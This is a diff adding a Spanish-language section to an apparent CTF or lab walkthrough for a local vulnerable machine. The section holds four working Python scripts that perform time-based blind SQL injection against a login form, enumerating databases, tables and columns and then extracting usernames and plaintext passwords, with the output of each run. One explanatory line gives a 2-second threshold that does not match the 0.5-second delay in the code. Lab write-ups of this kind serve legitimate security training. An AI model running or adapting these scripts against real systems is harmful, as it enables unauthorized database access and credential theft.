@@ -526,3 +526,249 @@ uid=0(root) gid=0(root) grupos=0(root)
 ```
 
 ya somos root
+
+
+## APORTACIÓN PARA EL TIME BASED ERROR
+
+Me aburría, y creé un script para buscar primero las bases de datos:
+
+```bash
+import requests
+import time
+
+TARGET = "http://192.168.1.45/login.php"
+DELAY = 0.5 # Ajustar tiempo
+MAX_LEN = 20
+MAX_DB = 5
+
+headers = {
+    'Content-Type': 'application/x-www-form-urlencoded'
+}
+
+print("[*] Enumerando nombres de bases de datos con inyección ciega de tiempo...\n")
+
+for db_index in range(MAX_DB):
+    db_name = ""
+    for i in range(1, MAX_LEN + 1):
+        found = False
+        for ascii_code in range(32, 127):  # Caracteres imprimibles
+            payload = (
+                f"' OR IF(ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata "
+                f"LIMIT {db_index},1),{i},1))={ascii_code},SLEEP({DELAY}),0)-- -"
+            )
+            data = {
+                'user': payload,
+                'pass': 'x'
+            }
+
+            start = time.time()
+            requests.post(TARGET, data=data, headers=headers)
+            elapsed = time.time() - start
+
+            if elapsed > DELAY:
+                db_name += chr(ascii_code)
+                print(f"\r[+] Base de datos #{db_index}: {db_name}", end='', flush=True)
+                found = True
+                break
+
+        if not found:
+            break
+    if db_name:
+        print()  # Salto de línea después del nombre completo
+```
+ Qué hace:
+Recorre posibles nombres de bases de datos (schema_name) uno a uno.
+
+Letra por letra, comprueba si el carácter coincide.
+
+Si el servidor tarda >2s, considera que ha acertado y guarda la letra.
+
+
+```
+python script.py                                                                                                                                                                         
+[*] Enumerando nombres de bases de datos con inyección ciega de tiempo...
+
+[+] Base de datos #0: information_schema
+[+] Base de datos #1: sion
+[+] Base de datos #2: mysql
+[+] Base de datos #3: performance_schema
+[+] Base de datos #4: Nebuchadnezzar
+```
+
+Ahora enumeramos las tablas de la base de datos Nebuchadnezzar:
+
+```bash
+import requests
+import time
+
+TARGET = "http://192.168.1.45/login.php"
+DELAY = 0.5
+MAX_LEN = 20
+MAX_TABLES = 10  # Cantidad de tablas que quieres enumerar
+
+headers = {
+    'Content-Type': 'application/x-www-form-urlencoded'
+}
+
+print("[*] Enumerando nombres de tablas de la base de datos 'Nebuchadnezzar'...\n")
+
+for table_index in range(MAX_TABLES):
+    table_name = ""
+    for i in range(1, MAX_LEN + 1):
+        found = False
+        for ascii_code in range(32, 127):  # Caracteres imprimibles
+            payload = (
+                f"' OR IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables "
+                f"WHERE table_schema='Nebuchadnezzar' LIMIT {table_index},1),{i},1))={ascii_code},SLEEP({DELAY}),0)-- -"
+            )
+            data = {
+                'user': payload,
+                'pass': 'x'
+            }
+
+            start = time.time()
+            requests.post(TARGET, data=data, headers=headers)
+            elapsed = time.time() - start
+
+            if elapsed > DELAY:
+                table_name += chr(ascii_code)
+                print(f"\r[+] Tabla #{table_index}: {table_name}", end='', flush=True)
+                found = True
+                break
+
+        if not found:
+            break
+    if table_name:
+        print()  # Salto de línea después del nombre completo
+```
+```
+python script_tablas.py                                                                                                                                                                   
+[*] Enumerando nombres de tablas de la base de datos 'Nebuchadnezzar'...
+
+[+] Tabla #0: users
+```
+
+Ahora enumeramso columnas:
+```bash
+import requests
+import time
+
+TARGET = "http://192.168.1.45/login.php"
+DELAY = 0.5
+MAX_LEN = 20
+MAX_COLS = 10  # Número máximo de columnas que intentaremos enumerar
+
+headers = {
+    'Content-Type': 'application/x-www-form-urlencoded'
+}
+
+print("[*] Enumerando nombres de columnas de la tabla 'users' en la base de datos 'Nebuchadnezzar'...\n")
+
+for col_index in range(MAX_COLS):
+    col_name = ""
+    for i in range(1, MAX_LEN + 1):
+        found = False
+        for ascii_code in range(32, 127):  # Caracteres imprimibles
+            payload = (
+                f"' OR IF(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns "
+                f"WHERE table_schema='Nebuchadnezzar' AND table_name='users' LIMIT {col_index},1),{i},1))={ascii_code},SLEEP({DELAY}),0)-- -"
+            )
+            data = {
+                'user': payload,
+                'pass': 'x'
+            }
+
+            start = time.time()
+            requests.post(TARGET, data=data, headers=headers)
+            elapsed = time.time() - start
+
+            if elapsed > DELAY:
+                col_name += chr(ascii_code)
+                print(f"\r[+] Columna #{col_index}: {col_name}", end='', flush=True)
+                found = True
+                break
+
+        if not found:
+            break
+    if col_name:
+        print()  # Salto de línea después del nombre completo
+```
+```
+[*] Enumerando nombres de columnas de la tabla 'users' en la base de datos 'Nebuchadnezzar'...
+
+[+] Columna #0: id
+[+] Columna #1: username
+[+] Columna #2: password
+
+```
+Ahora extraemkos los datos
+
+```bash
+import requests
+import time
+
+TARGET = "http://192.168.1.45/login.php"
+DELAY = 0.5
+MAX_LEN = 30      # Máximo largo esperado para cada dato
+MAX_ROWS = 10     # Número máximo de filas a extraer
+DB_NAME = "Nebuchadnezzar"
+TABLE_NAME = "users"
+COLUMNS = ["id", "username", "password"]
+
+headers = {
+    'Content-Type': 'application/x-www-form-urlencoded'
+}
+
+def extract_value(row_index, column_name):
+    value = ""
+    for i in range(1, MAX_LEN + 1):
+        found_char = False
+        for ascii_code in range(32, 127):  # caracteres imprimibles
+            payload = (
+                f"' OR IF(ASCII(SUBSTRING((SELECT {column_name} FROM {DB_NAME}.{TABLE_NAME} "
+                f"LIMIT {row_index},1), {i}, 1)) = {ascii_code}, SLEEP({DELAY}), 0)-- -"
+            )
+            data = {'user': payload, 'pass': 'x'}
+
+            start = time.time()
+            requests.post(TARGET, data=data, headers=headers)
+            elapsed = time.time() - start
+
+            if elapsed > DELAY:
+                value += chr(ascii_code)
+                print(f"\r[+] Fila #{row_index}, columna '{column_name}': {value}", end='', flush=True)
+                found_char = True
+                break
+
+        if not found_char:
+            break
+    return value
+
+print(f"[*] Extrayendo datos de la tabla '{TABLE_NAME}' en la base '{DB_NAME}'...\n")
+
+for row in range(MAX_ROWS):
+    row_data = []
+    empty_row = True
+    for col in COLUMNS:
+        val = extract_value(row, col)
+        if val:
+            empty_row = False
+        row_data.append(val)
+    if empty_row:
+        print("\n[+] Fin de datos.")
+        break
+    print()  # salto línea después de cada fila
+    print(f"Fila #{row}:", row_data)
+```
+```
+[*] Extrayendo datos de la tabla 'users' en la base 'Nebuchadnezzar'...
+
+[+] Fila #0, columna 'password': F4ckTh3F4k3H4ck3r5
+Fila #0: ['1', 'shelly', 'F4ckTh3F4k3H4ck3r5']
+[+] Fila #1, columna 'password': cambiame2025
+Fila #1: ['2', 'admin', 'cambiame2025']
+
+[+] Fin de datos.
+```
+
+
